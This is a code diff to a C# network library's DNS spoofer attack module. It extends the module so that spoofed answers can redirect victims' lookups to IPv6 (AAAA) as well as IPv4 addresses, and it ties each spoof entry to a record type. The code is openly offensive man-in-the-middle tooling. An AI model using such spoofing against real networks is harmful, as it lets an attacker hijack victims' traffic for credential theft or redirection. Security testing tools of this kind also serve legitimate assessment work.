@@ -65,14 +65,15 @@ namespace eExNetworkLibrary.Attacks.Modification
         /// <param name="dnsEntry">The DNS spoofer entry to add</param>
         public void AddDNSSpooferEntry(DNSSpooferEntry dnsEntry)
         {
-            if (dnsEntry.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+            if (dnsEntry.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork 
+                || dnsEntry.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
             {
                 lDNSSpooferEntries.Add(dnsEntry);
                 this.InvokeExternalAsync(DNSSpooferEntryAdded, new DNSSpooferEventArgs(dnsEntry));
             }
             else
             {
-                throw new ArgumentException("Only IPv4 Addresses are currently supported.");
+                throw new ArgumentException("Only IPv4 or IPv6 Addresses are currently supported.");
             }
         }
 
@@ -158,16 +159,13 @@ namespace eExNetworkLibrary.Attacks.Modification
 
         private void ProcessDNSRecord(DNSResourceRecord r, IPAddress ipaVictim)
         {
-            if (r.Type.Equals(DNSResourceType.A))
+            foreach (DNSSpooferEntry dsEntry in lDNSSpooferEntries)
             {
-                foreach (DNSSpooferEntry dsEntry in lDNSSpooferEntries)
+                if (dsEntry.IsMatch(r))
                 {
-                    if (dsEntry.IsMatch(r))
-                    {
-                        r.ResourceData = dsEntry.Address.GetAddressBytes();
-                        InvokeExternalAsync(Spoofed, new DNSSpoofedEventArgs(dsEntry, ipaVictim, (string)r.Name.Clone()));
-                        break;
-                    }
+                    r.ResourceData = dsEntry.Address.GetAddressBytes();
+                    InvokeExternalAsync(Spoofed, new DNSSpoofedEventArgs(dsEntry, ipaVictim, (string)r.Name.Clone()));
+                    break;
                 }
             }
         }
@@ -277,6 +275,11 @@ namespace eExNetworkLibrary.Attacks.Modification
         }
 
         /// <summary>
+        /// Gets or sets the record type to insert into the spoofed record.
+        /// </summary>
+        public DNSResourceType RecordType { get; set; }
+
+        /// <summary>
         /// The address which sould be inserted instead of the real address
         /// </summary>
         public IPAddress Address
@@ -290,11 +293,29 @@ namespace eExNetworkLibrary.Attacks.Modification
         /// </summary>
         /// <param name="strName">Gets or sets the DNS name for which the IP address should be spoofed</param>
         /// <param name="ipaToRedirect">The address which sould be inserted instead of the real address</param>
-        public DNSSpooferEntry(string strName, IPAddress ipaToRedirect)
+        public DNSSpooferEntry(string strName, IPAddress ipaToRedirect) : this(strName, ipaToRedirect, ipaToRedirect.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6 ? DNSResourceType.AAAA : DNSResourceType.A)
         {
+        }
+
+        /// <summary>
+        /// Creates a new instance of this class
+        /// </summary>
+        /// <param name="strName">Gets or sets the DNS name for which the IP address should be spoofed</param>
+        /// <param name="ipaToRedirect">The address which sould be inserted instead of the real address</param>
+        /// <param name="dnsRecordType">The record type of the record to spoof.</param>
+        public DNSSpooferEntry(string strName, IPAddress ipaToRedirect, DNSResourceType dnsRecordType)
+        {
+            if (ipaToRedirect.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork &&
+                ipaToRedirect.AddressFamily != System.Net.Sockets.AddressFamily.InterNetworkV6)
+            {
+                throw new ArgumentException("Only IPv4 and IPv6 addresses are supported at the moment.");
+            }
+
             this.strName = strName;
             this.ipaToRedirect = ipaToRedirect;
+            this.RecordType = dnsRecordType;
         }
+
 
         /// <summary>
         /// Returns a bool indicating whether the name associated with this DNSSpooferEntry is contained in the given name
@@ -313,7 +334,7 @@ namespace eExNetworkLibrary.Attacks.Modification
         /// <returns>A bool indicating whether the name associated with this DNSSpooferEntry is contained in the given DNSResourceRecord</returns>
         public bool IsMatch(DNS.DNSResourceRecord dnsRecord)
         {
-            return dnsRecord.Name.ToLower().Contains(strName.ToLower());
+            return dnsRecord.Name.ToLower().Contains(strName.ToLower()) && dnsRecord.Type == this.RecordType;
         }
 
         /// <summary>
